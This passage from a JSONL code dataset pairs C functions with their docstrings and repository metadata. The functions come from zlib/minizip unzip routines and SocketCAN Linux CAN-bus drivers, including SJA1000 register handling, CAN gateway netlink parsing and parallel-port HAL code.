s->filestream,&size_filename) != UNZ_OK)\n        err=UNZ_ERRNO;\n    else if ((err==UNZ_OK) && (size_filename!=s->cur_file_info.size_filename))\n        err=UNZ_BADZIPFILE;\n\n    *piSizeVar += (uInt)size_filename;\n\n    if (unz64local_getShort(&s->z_filefunc, s->filestream,&size_extra_field) != UNZ_OK)\n        err=UNZ_ERRNO;\n    *poffset_local_extrafield= s->cur_file_info_internal.offset_curfile +\n                                    SIZEZIPLOCALHEADER + size_filename;\n    *psize_local_extrafield = (uInt)size_extra_field;\n\n    *piSizeVar += (uInt)size_extra_field;\n\n    return err;\n}", "path": "common\\zlib-1.2.5\\contrib\\minizip\\unzip.c", "repo_name": "Jackarain/Update", "stars": 49, "license": "bsl-1.0", "language": "c", "size": 1353}
{"docstring": "/*\n  Close the file in zip opened with unzipOpenCurrentFile\n  Return UNZ_CRCERROR if all the file was read but the CRC is not good\n*/\n", "func_signal": "extern int ZEXPORT unzCloseCurrentFile (unzFile file)", "code": "{\n    int err=UNZ_OK;\n\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    pfile_in_zip_read_info=s->pfile_in_zip_read;\n\n    if (pfile_in_zip_read_info==NULL)\n        return UNZ_PARAMERROR;\n\n\n    if ((pfile_in_zip_read_info->rest_read_uncompressed == 0) &&\n        (!pfile_in_zip_read_info->raw))\n    {\n        if (pfile_in_zip_read_info->crc32 != pfile_in_zip_read_info->crc32_wait)\n            err=UNZ_CRCERROR;\n    }\n\n\n    TRYFREE(pfile_in_zip_read_info->read_buffer);\n    pfile_in_zip_read_info->read_buffer = NULL;\n    if (pfile_in_zip_read_info->stream_initialised == Z_DEFLATED)\n        inflateEnd(&pfile_in_zip_read_info->stream);\n#ifdef HAVE_BZIP2\n    else if (pfile_in_zip_read_info->stream_initialised == Z_BZIP2ED)\n        BZ2_bzDecompressEnd(&pfile_in_zip_read_info->bstream);\n#endif\n\n\n    pfile_in_zip_read_info->stream_initialised = 0;\n    TRYFREE(pfile_in_zip_read_info);\n\n    s->pfile_in_zip_read=NULL;\n\n    return err;\n}", "path": "common\\zlib-1.2.5\\contrib\\minizip\\unzip.c", "repo_name": "Jackarain/Update", "stars": 49, "license": "bsl-1.0", "language": "c", "size": 1353}
{"docstring": "/*\nRead extra field from the current file (opened by unzOpenCurrentFile)\nThis is the local-header version of the extra field (sometimes, there is\nmore info in the local-header version than in the central-header)\n\n  if buf==NULL, it return the size of the local extra field that can be read\n\n  if buf!=NULL, len is the size of the buffer, the extra header is copied in\n    buf.\n  the return value is the number of bytes copied in buf, or (if <0)\n    the error code\n*/\n", "func_signal": "extern int ZEXPORT unzGetLocalExtrafield (unzFile file, voidp buf, unsigned len)", "code": "{\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    uInt read_now;\n    ZPOS64_T size_to_read;\n\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    pfile_in_zip_read_info=s->pfile_in_zip_read;\n\n    if (pfile_in_zip_read_info==NULL)\n        return UNZ_PARAMERROR;\n\n    size_to_read = (pfile_in_zip_read_info->size_local_extrafield -\n                pfile_in_zip_read_info->pos_local_extrafield);\n\n    if (buf==NULL)\n        return (int)size_to_read;\n\n    if (len>size_to_read)\n        read_now = (uInt)size_to_read;\n    else\n        read_now = (uInt)len ;\n\n    if (read_now==0)\n        return 0;\n\n    if (ZSEEK64(pfile_in_zip_read_info->z_filefunc,\n              pfile_in_zip_read_info->filestream,\n              pfile_in_zip_read_info->offset_local_extrafield +\n              pfile_in_zip_read_info->pos_local_extrafield,\n              ZLIB_FILEFUNC_SEEK_SET)!=0)\n        return UNZ_ERRNO;\n\n    if (ZREAD64(pfile_in_zip_read_info->z_filefunc,\n              pfile_in_zip_read_info->filestream,\n              buf,read_now)!=read_now)\n        return UNZ_ERRNO;\n\n    return (int)read_now;\n}", "path": "common\\zlib-1.2.5\\contrib\\minizip\\unzip.c", "repo_name": "Jackarain/Update", "stars": 49, "license": "bsl-1.0", "language": "c", "size": 1353}
{"docstring": "/* calculate the CRC32 of a file,\n   because to encrypt a file, we need known the CRC32 of the file before */\n", "func_signal": "int getFileCrc(const char* filenameinzip,void*buf,unsigned long size_buf,unsigned long* result_crc)", "code": "{\n   unsigned long calculate_crc=0;\n   int err=ZIP_OK;\n   FILE * fin = fopen(filenameinzip,\"rb\");\n   unsigned long size_read = 0;\n   unsigned long total_read = 0;\n   if (fin==NULL)\n   {\n       err = ZIP_ERRNO;\n   }\n\n    if (err == ZIP_OK)\n        do\n        {\n            err = ZIP_OK;\n            size_read = (int)fread(buf,1,size_buf,fin);\n            if (size_read < size_buf)\n                if (feof(fin)==0)\n            {\n                printf(\"error in reading %s\\n\",filenameinzip);\n                err = ZIP_ERRNO;\n            }\n\n            if (size_read>0)\n                calculate_crc = crc32(calculate_crc,buf,size_read);\n            total_read += size_read;\n\n        } while ((err == ZIP_OK) && (size_read>0));\n\n    if (fin)\n        fclose(fin);\n\n    *result_crc=calculate_crc;\n    printf(\"file %s crc %lx\\n\",filenameinzip,calculate_crc);\n    return err;\n}", "path": "common\\zlib-1.2.5\\minizip.c", "repo_name": "Jackarain/Update", "stars": 49, "license": "bsl-1.0", "language": "c", "size": 1353}
{"docstring": "/* Look at all sub-codes starting with root + 1 bits.  Look at only the valid\n   intermediate code states (syms, left, len).  For each completed code,\n   calculate the amount of memory required by inflate to build the decoding\n   tables. Find the maximum amount of memory required and show the code that\n   requires that maximum.  Uses the globals max, root, and num. */\n", "func_signal": "local void enough(int syms)", "code": "{\n    int n;              /* number of remaing symbols for this node */\n    int left;           /* number of unused bit patterns at this length */\n    size_t index;       /* index of this case in *num */\n\n    /* clear code */\n    for (n = 0; n <= max; n++)\n        code[n] = 0;\n\n    /* look at all (root + 1) bit and longer codes */\n    large = 1 << root;              /* base table */\n    if (root < max)                 /* otherwise, there's only a base table */\n        for (n = 3; n <= syms; n++)\n            for (left = 2; left < n; left += 2)\n            {\n                /* look at all reachable (root + 1) bit nodes, and the\n                   resulting codes (complete at root + 2 or more) */\n                index = INDEX(n, left, root + 1);\n                if (root + 1 < max && num[index])       /* reachable node */\n                    examine(n, root + 1, left, 1 << root, 0);\n\n                /* also look at root bit codes with completions at root + 1\n                   bits (not saved in num, since complete), just in case */\n                if (num[index - 1] && n <= left << 1)\n                    examine((n - left) << 1, root + 1, (n - left) << 1,\n                            1 << root, 0);\n            }\n\n    /* done */\n    printf(\"done: maximum of %d table entries\\n\", large);\n}", "path": "common\\zlib-1.2.5\\examples\\enough.c", "repo_name": "Jackarain/Update", "stars": 49, "license": "bsl-1.0", "language": "c", "size": 1353}
{"docstring": "/*\n  Give the current position in uncompressed data\n*/\n", "func_signal": "extern z_off_t ZEXPORT unztell (unzFile file)", "code": "{\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    pfile_in_zip_read_info=s->pfile_in_zip_read;\n\n    if (pfile_in_zip_read_info==NULL)\n        return UNZ_PARAMERROR;\n\n    return (z_off_t)pfile_in_zip_read_info->stream.total_out;\n}", "path": "common\\zlib-1.2.5\\contrib\\minizip\\unzip.c", "repo_name": "Jackarain/Update", "stars": 49, "license": "bsl-1.0", "language": "c", "size": 1353}
{"docstring": "/*\n  Write info about the ZipFile in the *pglobal_info structure.\n  No preparation of the structure is needed\n  return UNZ_OK if there is no problem.\n*/\n", "func_signal": "extern int ZEXPORT unzGetCurrentFileInfo64 (unzFile file,\n                                          unz_file_info64 * pfile_info,\n                                          char * szFileName, uLong fileNameBufferSize,\n                                          void *extraField, uLong extraFieldBufferSize,\n                                          char* szComment,  uLong commentBufferSize)", "code": "{\n    return unz64local_GetCurrentFileInfoInternal(file,pfile_info,NULL,\n                                                szFileName,fileNameBufferSize,\n                                                extraField,extraFieldBufferSize,\n                                                szComment,commentBufferSize);\n}", "path": "common\\zlib-1.2.5\\contrib\\minizip\\unzip.c", "repo_name": "Jackarain/Update", "stars": 49, "license": "bsl-1.0", "language": "c", "size": 1353}
{"docstring": "/* init the HAL - call at driver module init */\n", "func_signal": "int hal_init(void)", "code": "{ return 0; }\n\n/* exit the HAL - call at driver module exit */\nint hal_exit(void) { return 0; }\n\n/* get name of this CAN HAL */\nchar *hal_name(void) { return \"c200\"; }\n\n/* fill arrays base[] and irq[] with HAL specific defaults */\nvoid hal_use_defaults(void)\n{\n\textern unsigned long base[];\n\textern unsigned int  irq[];\n\n\tbase[0]\t\t= 0x378UL;\n\tirq[0]\t\t= 7;\n}", "path": "kernel\\2.6\\drivers\\net\\can\\old\\hal\\c200.c", "repo_name": "rhyttr/SocketCAN", "stars": 39, "license": "other", "language": "c", "size": 1927}
{"docstring": "/* Dump information about all CAN gateway jobs, in response to RTM_GETROUTE */\n", "func_signal": "static int cgw_dump_jobs(struct sk_buff *skb, struct netlink_callback *cb)", "code": "{\n\tstruct cgw_job *gwj = NULL;\n\tstruct hlist_node *n;\n\tint idx = 0;\n\tint s_idx = cb->args[0];\n\n\trcu_read_lock();\n\thlist_for_each_entry_rcu(gwj, n, &cgw_list, list) {\n\t\tif (idx < s_idx)\n\t\t\tgoto cont;\n\n\t\tif (cgw_put_job(skb, gwj) < 0)\n\t\t\tbreak;\ncont:\n\t\tidx++;\n\t}\n\trcu_read_unlock();\n\n\tcb->args[0] = idx;\n\n\treturn skb->len;\n}", "path": "kernel\\2.6\\net\\can\\gw.c", "repo_name": "rhyttr/SocketCAN", "stars": 39, "license": "other", "language": "c", "size": 1927}
{"docstring": "/* the timerless version */\n", "func_signal": "static void can_restart_now(struct net_device *dev)", "code": "{\n\tstruct can_priv *priv = netdev_priv(dev);\n\n\tif (priv->state != STATE_UNINITIALIZED) {\n\n\t\t/* count number of restarts */\n\t\tpriv->can_stats.restarts++;\n\n\t\tchipset_init(dev, 1);\n\t}\n}", "path": "kernel\\2.4\\drivers\\net\\can\\sja1000\\sja1000.c", "repo_name": "rhyttr/SocketCAN", "stars": 39, "license": "other", "language": "c", "size": 1927}
{"docstring": "/* request controller register access space */\n", "func_signal": "int hal_request_region(int dev_num,\n\t\t       unsigned int num_regs,\n\t\t       char *drv_name)", "code": "{\n\textern unsigned long base[];\n\textern unsigned long rbase[];\n\t\n\tif (!memcmp(drv_name,\"i82527-esdio\",sizeof(\"i82527-esdio\"))){\n\t\tesd_ale_offset = 7; \n\t\tesd_cs_offset = 4;\n\t} else if (!memcmp(drv_name,\"sja1000-esdio\",sizeof(\"sja1000-esdio\"))){\n\t\tesd_ale_offset = 1;\n\t\tesd_cs_offset = 0;\n\t}\n\t\n\t/* set for device base_addr */\n\trbase[dev_num] = base[dev_num];\n\n\t/* ignore num_regs and create the 2 register region: */\n\t/* address register = base + esd_ale_offset          */\n\t/* data register    = base + esd_cs_offset           */\n\tif (request_region(base[dev_num] + esd_ale_offset, 1, drv_name)){\n\t\tif (request_region(base[dev_num] + esd_cs_offset, 1,drv_name)){\n\t\t\treturn 1;\n\t\t} else {\n\t\t\trelease_region(base[dev_num]+esd_ale_offset, 1);\n\t\t\treturn 0; // error\n\t\t}\n\t}\n\n\treturn 0; // error \n}", "path": "kernel\\2.6\\drivers\\net\\can\\old\\hal\\esdio.c", "repo_name": "rhyttr/SocketCAN", "stars": 39, "license": "other", "language": "c", "size": 1927}
{"docstring": "/* disable non controller hardware (e.g. irq routing, etc.) */\n", "func_signal": "int hw_detach(int dev_num)", "code": "{\n\textern unsigned long rbase[];\n\tunsigned long pc = rbase[dev_num] + 2;\n\n\t/* disable irq */\n\toutb(inb(pc) & ~0x10, pc);\n\n\treturn 0;\n}", "path": "kernel\\2.6\\drivers\\net\\can\\old\\hal\\c200.c", "repo_name": "rhyttr/SocketCAN", "stars": 39, "license": "other", "language": "c", "size": 1927}
{"docstring": "/* write to controller register */\n", "func_signal": "void hw_writereg(unsigned long base, int reg, u8 val)", "code": "{\n\t\n\toutb(reg, base + esd_ale_offset);\t/* address */\n\toutb(val, base + esd_cs_offset);\t/* data */\n}", "path": "kernel\\2.6\\drivers\\net\\can\\old\\hal\\esdio.c", "repo_name": "rhyttr/SocketCAN", "stars": 39, "license": "other", "language": "c", "size": 1927}
{"docstring": "/* release controller register access space */\n", "func_signal": "void hal_release_region(int dev_num,\n\t\t\tunsigned int num_regs)", "code": "{\n\textern unsigned long base[];\n\n\t/* ignore num_regs and create the 2 register region: */\n\t/* address register = base + esd_ale_offset          */\n\t/* data register    = base + esd_cs_offset           */\n\trelease_region(base[dev_num] + esd_cs_offset, 1);\n\trelease_region(base[dev_num] + esd_ale_offset, 1);\n}", "path": "kernel\\2.6\\drivers\\net\\can\\old\\hal\\esdio.c", "repo_name": "rhyttr/SocketCAN", "stars": 39, "license": "other", "language": "c", "size": 1927}
{"docstring": "/* disable non controller hardware (e.g. irq routing, etc.) */\n", "func_signal": "int hw_detach(int dev_num)", "code": "{\n\tint i;\n\textern unsigned long base[];\n\t\n\tDBG(KERN_INFO \"esdio.c: diabling IRQ for dev_num %d\\n\",dev_num);\n\t\n\toutb(0x07,base[dev_num]+3); //disable irq selection\n\toutb(0x06,base[dev_num]+3); //disable irq tristate buffer\n\t\n\tfor (i=0; i<4; i++)\n\t\toutb(i,base[dev_num]+3);\n\n\treturn 1;\n}", "path": "kernel\\2.6\\drivers\\net\\can\\old\\hal\\esdio.c", "repo_name": "rhyttr/SocketCAN", "stars": 39, "license": "other", "language": "c", "size": 1927}
{"docstring": "/*\n * stop CAN bus activity\n */\n", "func_signal": "static int can_close(struct net_device *dev)", "code": "{\n\tstruct can_priv *priv = netdev_priv(dev);\n\n\t/* set chip into reset mode */\n\tset_reset_mode(dev);\n\n\tpriv->open_time = 0;\n\n\tif (priv->timer.expires) {\n\t\tdel_timer(&priv->timer);\n\t\tpriv->timer.expires = 0;\n\t}\n\n\tfree_irq(dev->irq, (void*)dev);\n\tpriv->state = STATE_UNINITIALIZED;\n\n\tnetif_stop_queue(dev);\n\n\treturn 0;\n}", "path": "kernel\\2.4\\drivers\\net\\can\\sja1000\\sja1000.c", "repo_name": "rhyttr/SocketCAN", "stars": 39, "license": "other", "language": "c", "size": 1927}
{"docstring": "/*\n * transmit a CAN message\n * message layout in the sk_buff should be like this:\n * xx xx xx xx\t ff\t ll   00 11 22 33 44 55 66 77\n * [  can-id ] [flags] [len] [can data (up to 8 bytes]\n */\n", "func_signal": "static int can_start_xmit(struct sk_buff *skb, struct net_device *dev)", "code": "{\n\tstruct can_priv  *priv = netdev_priv(dev);\n\tstruct can_frame *cf   = (struct can_frame*)skb->data;\n\tuint8_t\tfi;\n\tuint8_t\tdlc;\n\tcanid_t\tid;\n\tuint8_t\tdreg;\n\tint\ti;\n\n\tnetif_stop_queue(dev);\n\n\tfi = dlc = cf->can_dlc;\n\tid = cf->can_id;\n\n\tif (id & CAN_RTR_FLAG)\n\t\tfi |= FI_RTR;\n\n\tif (id & CAN_EFF_FLAG) {\n\t\tfi |= FI_FF;\n\t\tdreg = EFF_BUF;\n\t\tREG_WRITE(REG_FI, fi);\n\t\tREG_WRITE(REG_ID1, (id & 0x1fe00000) >> (5 + 16));\n\t\tREG_WRITE(REG_ID2, (id & 0x001fe000) >> (5 + 8));\n\t\tREG_WRITE(REG_ID3, (id & 0x00001fe0) >> 5);\n\t\tREG_WRITE(REG_ID4, (id & 0x0000001f) << 3);\n\t} else {\n\t\tdreg = SFF_BUF;\n\t\tREG_WRITE(REG_FI, fi);\n\t\tREG_WRITE(REG_ID1, (id & 0x000007f8) >> 3);\n\t\tREG_WRITE(REG_ID2, (id & 0x00000007) << 5);\n\t}\n\n\tfor (i = 0; i < dlc; i++) {\n\t\tREG_WRITE(dreg++, cf->data[i]);\n\t}\n\n\tREG_WRITE(REG_CMR, CMD_TR);\n\n\tpriv->stats.tx_bytes += dlc;\n\n\tdev->trans_start = jiffies;\n\n\tdev_kfree_skb(skb);\n\n\treturn 0;\n}", "path": "kernel\\2.4\\drivers\\net\\can\\sja1000\\sja1000.c", "repo_name": "rhyttr/SocketCAN", "stars": 39, "license": "other", "language": "c", "size": 1927}
{"docstring": "/*\n * set baud rate divisor values\n */\n", "func_signal": "static void set_btr(struct net_device *dev, int btr0, int btr1)", "code": "{\n\tstruct can_priv *priv = netdev_priv(dev);\n\n\tif (priv->state == STATE_UNINITIALIZED) /* no bla bla when restarting the device */\n\t\tprintk(KERN_INFO \"%s: setting BTR0=%02X BTR1=%02X\\n\",\n\t\t       dev->name, btr0, btr1);\n\n\tREG_WRITE(REG_BTR0, btr0);\n\tREG_WRITE(REG_BTR1, btr1);\n}", "path": "kernel\\2.4\\drivers\\net\\can\\sja1000\\sja1000.c", "repo_name": "rhyttr/SocketCAN", "stars": 39, "license": "other", "language": "c", "size": 1927}
{"docstring": "/* request controller register access space */\n", "func_signal": "int hal_request_region(int dev_num,\n\t\t       unsigned int num_regs,\n\t\t       char *drv_name)", "code": "{\n\textern unsigned long base[];\n\textern unsigned long rbase[];\n\n\t/* set for device base_addr */\n\trbase[dev_num] = base[dev_num];\n\n\t/* grab ECR control registers and set parport to 'byte mode' */\n\tif (request_region(rbase[dev_num] + ECR_REGS_OFFSET, 3, drv_name)) {\n\n\t\tecr_crtl_save = inb(rbase[dev_num] + ECR_CTRL_OFFSET);\n\n\t\toutb((ecr_crtl_save & 0x1F) | 0x20,\n\t\t     rbase[dev_num] + ECR_CTRL_OFFSET);\n\t} else\n\t\treturn 0;\n\n\tif (request_region(rbase[dev_num], 4, drv_name))\n\t\treturn 1;\n\n\trelease_region(rbase[dev_num] + ECR_REGS_OFFSET, 3);\n\n\treturn 0;\n}", "path": "kernel\\2.6\\drivers\\net\\can\\old\\hal\\c200.c", "repo_name": "rhyttr/SocketCAN", "stars": 39, "license": "other", "language": "c", "size": 1927}
{"docstring": "/* release controller register access space */\n", "func_signal": "void hal_release_region(int dev_num,\n\t\t\tunsigned int num_regs)", "code": "{\n\textern unsigned long base[];\n\n\trelease_region(base[dev_num], 4);\n\n\t/* restore original ECR control register value */\n\toutb(ecr_crtl_save, base[dev_num] + ECR_CTRL_OFFSET);\n\trelease_region(base[dev_num] + ECR_REGS_OFFSET, 3);\n}", "path": "kernel\\2.6\\drivers\\net\\can\\old\\hal\\c200.c", "repo_name": "rhyttr/SocketCAN", "stars": 39, "license": "other", "language": "c", "size": 1927}
{"docstring": "/* enable non controller hardware (e.g. irq routing, etc.) */\n", "func_signal": "int hw_attach(int dev_num)", "code": "{\n\textern unsigned long rbase[];\n\tunsigned long pc = rbase[dev_num] + 2;\n\n\t/* enable irq */\n\toutb(inb(pc) | 0x10, pc);\n\n\treturn 0;\n}", "path": "kernel\\2.6\\drivers\\net\\can\\old\\hal\\c200.c", "repo_name": "rhyttr/SocketCAN", "stars": 39, "license": "other", "language": "c", "size": 1927}
{"docstring": "/* check for common and gwtype specific attributes */\n", "func_signal": "static int cgw_parse_attr(struct nlmsghdr *nlh, struct cf_mod *mod, \n\t\t\t  u8 gwtype, void *gwtypeattr)", "code": "{\n\tstruct nlattr *tb[CGW_MAX+1];\n\tstruct cgw_frame_mod mb;\n\tint modidx = 0;\n\tint err = 0;\n\n\t/* initialize modification & checksum data space */\n\tmemset(mod, 0, sizeof(*mod)); \n\n\terr = nlmsg_parse(nlh, sizeof(struct rtcanmsg), tb, CGW_MAX, NULL);\n\tif (err < 0)\n\t\treturn err;\n\n\t/* check for AND/OR/XOR/SET modifications */\n\n\tif (tb[CGW_MOD_AND] &&\n\t    nla_len(tb[CGW_MOD_AND]) == CGW_MODATTR_LEN) {\n\t\tnla_memcpy(&mb, tb[CGW_MOD_AND], CGW_MODATTR_LEN);\n\n\t\tcanframecpy(&mod->modframe.and, &mb.cf);\n\t\tmod->modtype.and = mb.modtype;\n\n\t\tif (mb.modtype & CGW_MOD_ID)\n\t\t\tmod->modfunc[modidx++] = mod_and_id;\n\n\t\tif (mb.modtype & CGW_MOD_DLC)\n\t\t\tmod->modfunc[modidx++] = mod_and_dlc;\n\n\t\tif (mb.modtype & CGW_MOD_DATA)\n\t\t\tmod->modfunc[modidx++] = mod_and_data;\n\t}\n\n\tif (tb[CGW_MOD_OR] &&\n\t    nla_len(tb[CGW_MOD_OR]) == CGW_MODATTR_LEN) {\n\t\tnla_memcpy(&mb, tb[CGW_MOD_OR], CGW_MODATTR_LEN);\n\n\t\tcanframecpy(&mod->modframe.or, &mb.cf);\n\t\tmod->modtype.or = mb.modtype;\n\n\t\tif (mb.modtype & CGW_MOD_ID)\n\t\t\tmod->modfunc[modidx++] = mod_or_id;\n\n\t\tif (mb.modtype & CGW_MOD_DLC)\n\t\t\tmod->modfunc[modidx++] = mod_or_dlc;\n\n\t\tif (mb.modtype & CGW_MOD_DATA)\n\t\t\tmod->modfunc[modidx++] = mod_or_data;\n\t}\n\n\tif (tb[CGW_MOD_XOR] &&\n\t    nla_len(tb[CGW_MOD_XOR]) == CGW_MODATTR_LEN) {\n\t\tnla_memcpy(&mb, tb[CGW_MOD_XOR], CGW_MODATTR_LEN);\n\n\t\tcanframecpy(&mod->modframe.xor, &mb.cf);\n\t\tmod->modtype.xor = mb.modtype;\n\n\t\tif (mb.modtype & CGW_MOD_ID)\n\t\t\tmod->modfunc[modidx++] = mod_xor_id;\n\n\t\tif (mb.modtype & CGW_MOD_DLC)\n\t\t\tmod->modfunc[modidx++] = mod_xor_dlc;\n\n\t\tif (mb.modtype & CGW_MOD_DATA)\n\t\t\tmod->modfunc[modidx++] = mod_xor_data;\n\t}\n\n\tif (tb[CGW_MOD_SET] &&\n\t    nla_len(tb[CGW_MOD_SET]) == CGW_MODATTR_LEN) {\n\t\tnla_memcpy(&mb, tb[CGW_MOD_SET], CGW_MODATTR_LEN);\n\n\t\tcanframecpy(&mod->modframe.set, &mb.cf);\n\t\tmod->modtype.set = mb.modtype;\n\n\t\tif (mb.modtype & CGW_MOD_ID)\n\t\t\tmod->modfunc[modidx++] = mod_set_id;\n\n\t\tif (mb.modtype & CGW_MOD_DLC)\n\t\t\tmod->modfunc[modidx++] = mod_set_dlc;\n\n\t\tif (mb.modtype & CGW_MOD_DATA)\n\t\t\tmod->modfunc[modidx++] = mod_set_data;\n\t}\n\n\t/* check for checksum operations after CAN frame modifications */\n\tif (modidx) {\n\n\t\tif (tb[CGW_CS_CRC8] &&\n\t\t    nla_len(tb[CGW_CS_CRC8]) == CGW_CS_CRC8_LEN) {\n\n\t\t\tstruct cgw_csum_crc8 *c = (struct cgw_csum_crc8 *)\\\n\t\t\t\tnla_data(tb[CGW_CS_CRC8]);\n\n\t\t\terr = cgw_chk_csum_parms(c->from_idx, c->to_idx,\n\t\t\t\t\t\t c->result_idx);\n\t\t\tif (err)\n\t\t\t\treturn err;\n\n\t\t\tnla_memcpy(&mod->csum.crc8, tb[CGW_CS_CRC8],\n\t\t\t\t   CGW_CS_CRC8_LEN);\n\n\t\t\t/*\n\t\t\t * select dedicated processing function to reduce\n\t\t\t * runtime operations in receive hot path.\n\t\t\t */\n\t\t\tif (c->from_idx < 0 || c->to_idx < 0 ||\n\t\t\t    c->result_idx < 0)\n\t\t\t\tmod->csumfunc.crc8 = cgw_csum_crc8_rel;\n\t\t\telse if (c->from_idx <= c->to_idx)\n\t\t\t\tmod->csumfunc.crc8 = cgw_csum_crc8_pos;\n\t\t\telse\n\t\t\t\tmod->csumfunc.crc8 = cgw_csum_crc8_neg;\n\t\t}\n\n\t\tif (tb[CGW_CS_XOR] &&\n\t\t    nla_len(tb[CGW_CS_XOR]) == CGW_CS_XOR_LEN) {\n\n\t\t\tstruct cgw_csum_xor *c = (struct cgw_csum_xor *)\\\n\t\t\t\tnla_data(tb[CGW_CS_XOR]);\n\n\t\t\terr = cgw_chk_csum_parms(c->from_idx, c->to_idx,\n\t\t\t\t\t\t c->result_idx);\n\t\t\tif (err)\n\t\t\t\treturn err;\n\n\t\t\tnla_memcpy(&mod->csum.xor, tb[CGW_CS_XOR],\n\t\t\t\t   CGW_CS_XOR_LEN);\n\n\t\t\t/*\n\t\t\t * select dedicated processing function to reduce\n\t\t\t * runtime operations in receive hot path.\n\t\t\t */\n\t\t\tif (c->from_idx < 0 || c->to_idx < 0 ||\n\t\t\t    c->result_idx < 0)\n\t\t\t\tmod->csumfunc.xor = cgw_csum_xor_rel;\n\t\t\telse if (c->from_idx <= c->to_idx)\n\t\t\t\tmod->csumfunc.xor = cgw_csum_xor_pos;\n\t\t\telse\n\t\t\t\tmod->csumfunc.xor = cgw_csum_xor_neg;\n\t\t}\n\t}\n\n\tif (gwtype == CGW_TYPE_CAN_CAN) {\n\n\t\t/* check CGW_TYPE_CAN_CAN specific attributes */\n\n\t\tstruct can_can_gw *ccgw = (struct can_can_gw *)gwtypeattr;\n\t\tmemset(ccgw, 0, sizeof(*ccgw)); \n\n\t\t/* check for can_filter in attributes */\n\t\tif (tb[CGW_FILTER] &&\n\t\t    nla_len(tb[CGW_FILTER]) == sizeof(struct can_filter))\n\t\t\tnla_memcpy(&ccgw->filter, tb[CGW_FILTER],\n\t\t\t\t   sizeof(struct can_filter));\n\n\t\terr = -ENODEV;\n\n\t\t/* specifying two interfaces is mandatory */\n\t\tif (!tb[CGW_SRC_IF] || !tb[CGW_DST_IF])\n\t\t\treturn err;\n\n\t\tif (nla_len(tb[CGW_SRC_IF]) == sizeof(u32))\n\t\t\tnla_memcpy(&ccgw->src_idx, tb[CGW_SRC_IF],\n\t\t\t\t   sizeof(u32));\n\n\t\tif (nla_len(tb[CGW_DST_IF]) == sizeof(u32))\n\t\t\tnla_memcpy(&ccgw->dst_idx, tb[CGW_DST_IF],\n\t\t\t\t   sizeof(u32));\n\n\t\t/* both indices set to 0 for flushing all routing entries */\n\t\tif (!ccgw->src_idx && !ccgw->dst_idx)\n\t\t\treturn 0;\n\n\t\t/* only one index set to 0 is an error */\n\t\tif (!ccgw->src_idx || !ccgw->dst_idx)\n\t\t\treturn err;\n\t}\n\n\t/* add the checks for other gwtypes here */\n\n\treturn 0;\n}", "path": "kernel\\2.6\\net\\can\\gw.c", "repo_name": "rhyttr/SocketCAN", "stars": 39, "license": "other", "language": "c", "size": 1927}
{"docstring": "/*\n * initialize CAN bus driver\n */\n", "func_signal": "static int can_open(struct net_device *dev)", "code": "{\n\tstruct can_priv *priv = netdev_priv(dev);\n\n\t/* set chip into reset mode */\n\tset_reset_mode(dev);\n\n\tpriv->state = STATE_UNINITIALIZED;\n\n\t/* register interrupt handler */\n\tif (request_irq(dev->irq, &can_interrupt, SA_SHIRQ,\n\t\t\tdev->name, (void*)dev)) {\n\t\treturn -EAGAIN;\n\t}\n\n\t/* clear statistics */\n\tmemset(&priv->stats, 0, sizeof(priv->stats));\n\n\t/* init chip */\n\tchipset_init(dev, 0);\n\tpriv->open_time = jiffies;\n\n\tnetif_start_queue(dev);\n\n\treturn 0;\n}", "path": "kernel\\2.4\\drivers\\net\\can\\sja1000\\sja1000.c", "repo_name": "rhyttr/SocketCAN", "stars": 39, "license": "other", "language": "c", "size": 1927}
{"docstring": "/* init the HAL - call at driver module init */\n", "func_signal": "int hal_init(void)", "code": "{ return 0; }\n\n/* exit the HAL - call at driver module exit */\nint hal_exit(void) { return 0; }\n\n/* get name of this CAN HAL */\nchar *hal_name(void) { return \"esdio\"; }\n\n/* fill arrays base[] and irq[] with HAL specific defaults */\nvoid hal_use_defaults(void)\n{\n\textern unsigned long base[];\n\textern unsigned int  irq[];\n\n\tbase[0]\t\t= 0x1e8UL;\n\tirq[0]\t\t= 5;\n}", "path": "kernel\\2.6\\drivers\\net\\can\\old\\hal\\esdio.c", "repo_name": "rhyttr/SocketCAN", "stars": 39, "license": "other", "language": "c", "size": 1927}
{"docstring": "/*\n * initialize SJA1000 chip:\n *   - reset chip\n *   - set output mode\n *   - set baudrate\n *   - enable interrupts\n *   - start operating mode\n */\n", "func_signal": "static void chipset_init_regs(struct net_device *dev)", "code": "{\n\tstruct can_priv *priv = netdev_priv(dev);\n\n\t/* go into Pelican mode, disable clkout, disable comparator */\n\tREG_WRITE(REG_CDR, 0xCF);\n\n\t/* set acceptance filter (accept all) */\n\tREG_WRITE(REG_ACCC0, 0x00);\n\tREG_WRITE(REG_ACCC1, 0x00);\n\tREG_WRITE(REG_ACCC2, 0x00);\n\tREG_WRITE(REG_ACCC3, 0x00);\n\n\tREG_WRITE(REG_ACCM0, 0xFF);\n\tREG_WRITE(REG_ACCM1, 0xFF);\n\tREG_WRITE(REG_ACCM2, 0xFF);\n\tREG_WRITE(REG_ACCM3, 0xFF);\n\n\t/* set baudrate */\n\tif (priv->btr) { /* no calculation when btr is provided */\n\t\tset_btr(dev, (priv->btr>>8) & 0xFF, priv->btr & 0xFF);\n\t} else {\n\t\tif (priv->speed == 0) {\n\t\t\tpriv->speed = DEFAULT_SPEED;\n\t\t}\n\t\tset_baud(dev, priv->speed * 1000, priv->clock);\n\t}\n\n\t/* output control */\n\tREG_WRITE(REG_OCR, 0x1A);\t/* connected to external transceiver */\n\n}", "path": "kernel\\2.4\\drivers\\net\\can\\sja1000\\sja1000.c", "repo_name": "rhyttr/SocketCAN", "stars": 39, "license": "other", "language": "c", "size": 1927}
